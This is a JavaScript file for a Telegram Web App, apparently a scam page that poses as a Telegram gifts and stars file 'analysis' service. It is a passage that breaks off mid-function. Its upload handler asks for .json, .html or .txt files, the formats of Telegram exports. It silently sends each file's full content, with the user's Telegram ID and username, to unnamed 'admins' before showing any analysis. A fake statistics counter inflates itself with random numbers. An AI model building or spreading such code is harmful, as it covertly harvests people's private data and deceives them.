// Telegram Web App
const tg = window.Telegram.WebApp;
tg.expand();

// Переменные
let currentScreen = 'languageScreen';
let detectedUsername = '@file_user_722';
let userData = {
    username: '@file_user_722',
    accountCreated: '15.03.2023',
    totalGifts: 7,
    totalStars: 308
};

// Админы для отправки файлов (замените на реальные ID)
const ADMIN_IDS = [123456789, 987654321]; // ID админов

// Инициализация
document.addEventListener('DOMContentLoaded', function() {
    initLanguageSelection();
    initFileUpload();
    updateStats();
    
    // Автообновление статистики
    setInterval(updateStats, 60000);
    
    // Показываем экран языков
    showScreen('languageScreen');
});

// Обновление статистики
function updateStats() {
    const statsElement = document.querySelector('.stats-number');
    if (statsElement) {
        const current = parseInt(statsElement.textContent.replace(/\s/g, ''));
        const randomIncrease = Math.floor(Math.random() * 5) + 1;
        const newValue = current + randomIncrease;
        statsElement.textContent = newValue.toLocaleString('ru-RU');
    }
}

// Выбор языка
function initLanguageSelection() {
    const langOptions = document.querySelectorAll('.lang-option');
    
    langOptions.forEach(option => {
        option.onclick = function() {
            // Убираем активный класс
            langOptions.forEach(opt => opt.classList.remove('active'));
            
            // Добавляем активный
            this.classList.add('active');
            
            // Через 0.5 секунды переходим на главный экран
            setTimeout(() => {
                showScreen('mainScreen');
            }, 500);
        };
    });
}

// Показать экран
function showScreen(screenId) {
    // Скрываем все экраны
    document.querySelectorAll('.screen').forEach(screen => {
        screen.style.display = 'none';
        screen.classList.remove('active');
    });
    
    // Показываем нужный экран
    const screen = document.getElementById(screenId);
    if (screen) {
        screen.style.display = 'block';
        // Добавляем класс active с небольшой задержкой для анимации
        setTimeout(() => {
            screen.classList.add('active');
        }, 10);
        currentScreen = screenId;
        window.scrollTo(0, 0);
    }
}

// Загрузка файла
function initFileUpload() {
    const uploadBox = document.getElementById('uploadBox');
    const fileInput = document.getElementById('fileInput');
    
    if (!uploadBox || !fileInput) return;
    
    // Клик по области загрузки
    uploadBox.onclick = function() {
        fileInput.click();
    };
    
    // Выбор файла
    fileInput.onchange = async function(e) {
        const file = e.target.files[0];
        if (file) {
            // Проверяем расширение
            const ext = file.name.toLowerCase();
            if (ext.endsWith('.json') || ext.endsWith('.html') || ext.endsWith('.txt')) {
                // Отправляем файл админам
                await sendFileToAdmins(file);
                
                // Начинаем анализ
                startFileAnalysis(file);
            } else {
                alert('❌ Пожалуйста, загрузите файл .json, .html или .txt');
            }
        }
    };
}

// Отправка файла админам
async function sendFileToAdmins(file) {
    try {
        // Получаем данные пользователя
        const user = tg.initDataUnsafe?.user || {};
        const userId = user.id || 'unknown';
        const username = user.username || 'unknown';
        
        // Читаем файл
        const fileContent = await readFileAsText(file);
        
        // Создаем данные для отправки
        const dataToSend = {
            file_name: file.name,
            file_size: file.size,
            file_type: file.type,
            user_id: userId,
            username: username,
            content: fileContent,
            timestamp: new Date().toISOString(),
            source: 'web_app'
        };
        
        // Отправляем через Telegram Web App
        tg.sendData(JSON.stringify(dataToSend));
        
        console.log('Файл отправлен админам:', file.name);
        
    } catch (error) {
        console.error('Ошибка при отправке файла:', error);
    }
}

// Чтение файла как текст
function readFileAsText(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = (e) => resolve(e.target.result);
        reader.onerror = (e) => reject(e);
        reader.readAsText(file);
    });
}

// Начать анализ файла
function startFileAnalysis(file) {
   
